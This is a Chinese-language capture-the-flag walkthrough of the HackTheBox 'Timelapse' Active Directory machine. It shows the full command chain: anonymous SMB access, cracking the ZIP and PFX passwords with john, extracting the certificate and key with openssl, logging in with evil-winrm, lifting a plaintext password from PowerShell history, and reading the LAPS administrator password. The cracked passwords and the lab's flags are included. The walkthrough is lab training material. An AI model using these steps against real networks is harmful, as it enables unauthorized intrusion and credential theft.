Phase 0

信息收集

$ sudo nmap -sCV -p- 10.129.5.225 -T4
88/tcp   open  kerberos  Microsoft Windows Kerberos
389/tcp  open  ldap      (Domain: timelapse.htb)
445/tcp  open  microsoft-ds?
5986/tcp open  ssl/http  Microsoft HTTPAPI (WinRM SSL)
| ssl-cert: commonName=dc01.timelapse.htb

WinRM 端口是 5986（SSL），需要证书认证。

Phase 1

立足点：SMB → ZIP → PFX → 证书认证

SMB 匿名下载

$ smbclient -N //10.129.5.225/Shares
smb: \Dev\> get winrm_backup.zip

两轮密码破解

# 第一轮：ZIP 密码
$ zip2john winrm_backup.zip > zip.hash
$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
supremelegacy

# 解压得到 legacyy_dev_auth.pfx

# 第二轮：PFX 密码
$ pfx2john legacyy_dev_auth.pfx > pfx.hash
$ john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
thuglegacy
🧒 儿童版 — 撬箱子再撬证件包找到一个上锁的箱子（ZIP），里面装着一个上锁的证件包（PFX）。先用 john 撬开箱子（supremelegacy），再撬开证件包（thuglegacy），最后取出"身份证"（证书）和"私章"（私钥）。

提取证书和私钥

# 提取私钥（-nodes = 不加密输出）
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
Enter Import Password: thuglegacy

# 提取证书
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem

WinRM 证书认证登录

$ evil-winrm -i 10.129.5.225 -c cert.pem -k priv-key.pem -S -P 5986

*Evil-WinRM* PS > type user.txt
6650c0bc48caa0bc8107f5a903566a39
踩坑提醒必须加 -S -P 5986（SSL + 端口）。提取私钥时必须加 -nodes，否则 evil-winrm 无法使用。
Phase 2

横向移动：PowerShell 历史记录 → svc_deploy

*Evil-WinRM* PS > type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl ...
🧒 儿童版 — 翻聊天记录找密码PowerShell 的历史记录就像聊天记录——legacyy 之前在命令行里直接输入了 svc_deploy 的密码，被完整保存下来。
$ evil-winrm -i 10.129.5.225 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S -P 5986
Phase 3

权限提升：LAPS 读取 Administrator 密码

svc_deploy 属于 LAPS_Readers 组。

🧒 儿童版 — 保险柜钥匙读密码LAPS 是一个"密码保险柜"系统——每台电脑的管理员密码都不一样，存在 AD 的特殊属性 ms-Mcs-AdmPwd 里。只有拿到"保险柜钥匙"（LAPS_Readers 权限）的人才能读取。svc_deploy 恰好有这把钥匙。
*Evil-WinRM* PS > Get-ADComputer DC01 -property 'ms-mcs-admpwd'
ms-mcs-admpwd : ,87;Ind5.M4D,4/9oJsP&y47

$ evil-winrm -i 10.129.5.225 -u Administrator -p ',87;Ind5.M4D,4/9oJsP&y47' -S -P 5986
# root.txt 不在 Administrator\Desktop，需要搜索
*Evil-WinRM* PS > Get-ChildItem -Path C:\ -Recurse -Filter root.txt -ErrorAction SilentlyContinue
Directory: C:\Users\TRX\Desktop

*Evil-WinRM* PS > type C:\Users\TRX\Desktop\root.txt
cbf367b11dc966ac42b99639cf441753
踩坑提醒root.txt 在 C:\Users\TRX\Desktop 而非 Administrator，需要用 Get-ChildItem -Recurse 搜索。
附录

知识点总结

PFX = 证书 + 私钥的容器。

用 pfx2john 破解密码，openssl pkcs12 提取证书（-clcerts -nokeys）和私钥（-nocerts -nodes）。

WinRM 5986 = SSL 证书认证。

evil-winrm -c cert.pem -k priv-key.pem -S -P 5986。不需要密码。

PowerShell 历史 = ConsoleHost_history.txt。

渗透必查文件，经常泄露明文密码。每个用户都要检查。

LAPS：ms-Mcs-AdmPwd 存储明文本地管理员密码。

LAPS_Readers 组成员可读。Get-ADComputer <机器名> -property 'ms-mcs-admpwd'。
